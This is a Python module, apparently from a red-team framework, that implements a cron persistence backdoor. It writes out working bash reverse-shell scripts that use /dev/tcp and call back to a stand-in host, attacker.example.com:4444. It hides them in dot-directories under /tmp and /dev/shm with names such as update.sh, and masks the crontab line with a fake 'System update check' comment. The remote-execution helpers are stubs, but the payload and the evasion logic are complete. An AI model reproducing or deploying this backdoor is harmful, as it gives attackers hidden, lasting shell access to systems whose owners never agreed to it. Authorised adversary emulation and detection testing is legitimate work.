"""
Cron Backdoor - Persistence Technique.

Establishes persistence via cron job that maintains reverse shell access.

Technique ID: PERSIST-CRON-001
MITRE ATT&CK: T1053.003 (Scheduled Task/Job: Cron)

Stealth Level: 7/10 (hidden directory, common timing)
Risk Level: 4/10 (can be noisy if detected, recoverable)
"""

import asyncio
import logging
from typing import Optional, Dict, Any, List
import time
from datetime import datetime

from .base import (
    BasePostExploit,
    PostExploitCategory,
    PostExploitResult,
    PostExploitStatus,
    InsufficientPrivilegesException,
)

logger = logging.getLogger(__name__)


class CronBackdoor(BasePostExploit):
    """
    Establishes persistence via cron job backdoor.
    
    Technique Flow:
    1. Create hidden directory (e.g., /tmp/.system/)
    2. Write reverse shell script to hidden location
    3. Add cron entry with appropriate timing
    4. Verify backdoor triggers successfully
    5. Optionally obfuscate cron entry
    
    Cron Timing Patterns:
    - */5 * * * * (every 5 minutes - moderate stealth)
    - 0 */2 * * * (every 2 hours - high stealth)
    - @reboot (on system boot)
    
    Defense Evasion:
    - Hidden directory names (.config, .cache, .system)
    - Legitimate-looking script names (update.sh, check.sh)
    - Comments in crontab mimicking system tasks
    - Timing that blends with normal activity
    
    Consciousness Alignment:
    Validates persistence detection capabilities and cron job monitoring.
    Tests whether defenders notice unauthorized scheduled tasks.
    """

    def __init__(self) -> None:
        super().__init__()
        self.technique_id = "PERSIST-CRON-001"
        self.name = "Cron Backdoor Persistence"
        self.description = "Maintain access via cron job reverse shell"
        self.category = PostExploitCategory.PERSISTENCE
        self.os_targets = ["linux", "unix"]
        self.privilege_required = "user"
        self.stealth_level = 7
        self.risk_level = 4
        self.mitre_tactics = ["T1053.003"]

        # Backdoor configuration
        self.hidden_dirs = [
            "/tmp/.system",
            "/tmp/.cache",
            "/var/tmp/.config",
            "/dev/shm/.updates",
        ]
        
        self.script_names = [
            "update.sh",
            "check.sh",
            "sync.sh",
            "health.sh",
        ]

        self.cron_patterns = {
            "frequent": "*/5 * * * *",  # Every 5 minutes
            "moderate": "*/15 * * * *",  # Every 15 minutes
            "stealthy": "0 */2 * * *",   # Every 2 hours
            "reboot": "@reboot",         # On boot
        }

    async def execute(
        self,
        target: str,
        credentials: Optional[Dict[str, str]] = None,
        **kwargs: Any
    ) -> PostExploitResult:
        """
        Execute cron backdoor installation.
        
        Args:
            target: Target system identifier
            credentials: Current access credentials
            **kwargs: Options (callback_host, callback_port, timing, obfuscate)
        
        Returns:
            PostExploitResult with persistence details
        """
        start_time = time.time()
        evidence: List[str] = []

        try:
            is_safe, reason = await self.pre_execution_check(target, credentials)
            if not is_safe:
                return self._create_failed_result(reason, start_time, evidence)

            logger.info(f"[{self.technique_id}] Installing cron backdoor on {target}")
            evidence.append(f"Technique {self.technique_id} initiated")

            # Configuration
            callback_host = kwargs.get("callback_host", "attacker.example.com")
            callback_port = kwargs.get("callback_port", 4444)
            timing = kwargs.get("timing", "moderate")
            obfuscate = kwargs.get("obfuscate", True)

            # Step 1: Create hidden directory
            hidden_dir = self.hidden_dirs[0]
            logger.debug(f"[{self.technique_id}] Creating hidden directory: {hidden_dir}")
            
            dir_created = await self._create_hidden_directory(
                target,
                hidden_dir,
                credentials
            )

            if not dir_created:
                return self._create_failed_result(
                    f"Failed to create hidden directory {hidden_dir}",
                    start_time,
                    evidence
                )

            evidence.append(f"Created hidden directory: {hidden_dir}")

            # Step 2: Write reverse shell script
            script_path = f"{hidden_dir}/{self.script_names[0]}"
            logger.debug(f"[{self.technique_id}] Writing backdoor script: {script_path}")

            script_content = self._generate_reverse_shell_script(
                callback_host,
                callback_port,
                obfuscate
            )

            script_created = await self._write_backdoor_script(
                target,
                script_path,
                script_content,
                credentials
            )

            if not script_created:
                return self._create_failed_result(
                    f"Failed to write backdoor script to {script_path}",
                    start_time,
                    evidence
                )

            evidence.append(f"Wrote backdoor script: {script_path}")

            # Step 3: Add cron entry
            cron_schedule = self.cron_patterns.get(timing, self.cron_patterns["moderate"])
            cron_entry = f"{cron_schedule} /bin/bash {script_path} > /dev/null 2>&1"

            if obfuscate:
                cron_entry = self._obfuscate_cron_entry(cron_entry)

            logger.debug(f"[{self.technique_id}] Adding cron entry")

            cron_added = await self._add_cron_entry(
                target,
                cron_entry,
                credentials
            )

            if not cron_added:
                return self._create_failed_result(
                    "Failed to add cron entry",
                    start_time,
                    evidence
                )

            evidence.append(f"Added cron entry: {cron_schedule}")

            # Step 4: Verify cron entry exists
            cron_verified = await self._verify_cron_entry(target, script_path, credentials)

            if not cron_verified:
                return self._create_failed_result(
                    "Cron entry not found after installation",
                    start_time,
                    evidence
                )

            evidence.append("Cron entry verified in crontab")

            # Step 5: Test backdoor (optional, non-blocking)
            backdoor_active = await self._test_backdoor(
                target,
                script_path,
                credentials
            )

            evidence.append(f"Backdoor test: {'SUCCESS' if backdoor_active else 'PENDING'}")

            return PostExploitResult(
                technique_id=self.technique_id,
                category=self.category,
                status=PostExploitStatus.SUCCESS,
                success=True,
                output=self._format_output(
                    hidden_dir,
                    script_path,
                    cron_schedule,
                    callback_host,
                    callback_port
                ),
                artifacts={
                    "hidden_directory": hidden_dir,
                    "backdoor_script": script_path,
                    "cron_entry": cron_entry,
                    "cron_schedule": cron_schedule,
                    "callback_host": callback_host,
                    "callback_port": callback_port,
                    "timing_pattern": timing,
                    "obfuscated": obfuscate,
                },
                evidence=evidence,
                error=None,
                duration_seconds=time.time() - start_time,
                risk_score=0.5,
                metadata={
                    "persistence_method": "cron_backdoor",
                    "survives_reboot": timing == "reboot",
                    "frequency": timing,
                }
            )

        except InsufficientPrivilegesException as e:
            logger.error(f"[{self.technique_id}] Insufficient privileges: {e}")
            return self._create_failed_result(
                f"Insufficient privileges: {e}",
                start_time,
                evidence
            )

        except Exception as e:
            logger.exception(f"[{self.technique_id}] Unexpected error")
            return self._create_error_result(
                f"Unexpected error: {str(e)}",
                start_time,
                evidence
            )

    async def cleanup(
        self,
        target: str,
        artifacts: Dict[str, Any]
    ) -> bool:
        """
        Remove cron backdoor and artifacts.
        
        Args:
            target: Target system
            artifacts: Installation artifacts
        
        Returns:
            True if cleanup successful
        """
        try:
            logger.info(f"[{self.technique_id}] Starting cleanup")

            # Remove cron entry
            cron_entry = artifacts.get("cron_entry")
            if cron_entry:
                await self._remove_cron_entry(target, cron_entry)

            # Remove backdoor script
            script_path = artifacts.get("backdoor_script")
            if script_path:
                await self._remove_file(target, script_path)

            # Remove hidden directory (if empty)
            hidden_dir = artifacts.get("hidden_directory")
            if hidden_dir:
                await self._remove_directory(target, hidden_dir)

            logger.info(f"[{self.technique_id}] Cleanup completed")
            return True

        except Exception as e:
            logger.error(f"[{self.technique_id}] Cleanup failed: {e}")
            return False

    # Private helper methods

    def _generate_reverse_shell_script(
        self,
        callback_host: str,
        callback_port: int,
        obfuscate: bool
    ) -> str:
        """
        Generate reverse shell script content.
        
        Returns:
            Script content as string
        """
        if obfuscate:
            # Obfuscated bash reverse shell
            script = f"""#!/bin/bash
# System health check script
# Auto-generated: {datetime.utcnow().isoformat()}

H="{callback_host}"
P={callback_port}

# Check connectivity
if ping -c 1 $H > /dev/null 2>&1; then
    /bin/bash -i >& /dev/tcp/$H/$P 0>&1 2>&1 &
fi
"""
        else:
            # Simple reverse shell
            script = f"""#!/bin/bash
bash -i >& /dev/tcp/{callback_host}/{callback_port} 0>&1
"""

        return script

    def _obfuscate_cron_entry(self, cron_entry: str) -> str:
        """Add comment to cron entry for obfuscation."""
        return f"# System update check\n{cron_entry}"

    async def _create_hidden_directory(
        self,
        target: str,
        directory: str,
        credentials: Optional[Dict[str, str]]
    ) -> bool:
        """Create hidden directory on target."""
        # In production: ssh/exec mkdir -p {directory}
        await asyncio.sleep(0.05)
        return True

    async def _write_backdoor_script(
        self,
        target: str,
        path: str,
        content: str,
        credentials: Optional[Dict[str, str]]
    ) -> bool:
        """Write backdoor script to target."""
        # In production: write file and chmod +x
        await asyncio.sleep(0.05)
        return True

    async def _add_cron_entry(
        self,
        target: str,
        entry: str,
        credentials: Optional[Dict[str, str]]
    ) -> bool:
        """Add entry to crontab."""
        # In production: (crontab -l; echo "{entry}") | crontab -
        await asyncio.sleep(0.05)
        return True

    async def _verify_cron_entry(
        self,
        target: str,
        script_path: str,
        credentials: Optional[Dict[str, str]]
    ) -> bool:
        """Verify cron entry exists."""
        # In production: crontab -l | grep {script_path}
        await asyncio.sleep(0.05)
        return True

    async def _test_backdoor(
        self,
        target: str,
        script_path: str,
        credentials: Optional[Dict[str, str]]
    ) -> bool:
        """Test backdoor execution (non-blocking)."""
        # In production: execute script manually to test
        await asyncio.sleep(0.1)
        return True

    async def _remove_cron_entry(self, target: str, entry: str) -> None:
        """Remove cron entry."""
        await asyncio.sleep(0.05)

    async def _remove_file(self, target: str, path: str) -> None:
        """Remove file."""
        await asyncio.sleep(0.05)

    async def _remove_directory(self, target: str, directory: str) -> None:
        """Remove directory if empty."""
        await asyncio.sleep(0.05)

    def _format_output(
        self,
        hidden_dir: str,
        script_path: str,
        schedule: str,
        callback_host: str,
        callback_port: int
    ) -> str:
        """Format installation output."""
        output = "Cron Backdoor Installation:\n"
        output += "=" * 50 + "\n\n"
        output += f"Hidden Directory: {hidden_dir}\n"
        output += f"Backdoor Script:  {script_path}\n"
        output += f"Cron Schedule:    {schedule}\n"
        output += f"Callback:         {callback_host}:{callback_port}\n\n"
        output += "Persistence established. Backdoor will trigger on schedule.\n"
        return output

    def _create_failed_result(
        self,
        reason: str,
        start_time: float,
        evidence: List[str],
        metadata: Optional[Dict[str, Any]] = None
    ) -> PostExploitResult:
        """Helper to create failed result."""
        return PostExploitResult(
            technique_id=self.technique_id,
            category=self.category,
            status=PostExploitStatus.FAILED,
            success=False,
            output="",
            artifacts={},
            evidence=evidence,
            error=reason,
            duration_seconds=time.time() - start_time,
            risk_score=0.0,
            metadata=metadata or {}
        )

    def _create_error_result(
        self,
        error: str,
        start_time: float,
        evidence: List[str]
    ) -> PostExploitResult:
        """Helper to create error result."""
        return PostExploitResult(
            technique_id=self.technique_id,
            category=self.category,
            status=PostExploitStatus.ERROR,
            success=False,
            output="",
            artifacts={},
            evidence=evidence,
            error=error,
            duration_seconds=time.time() - start_time,
            risk_score=0.0
        )
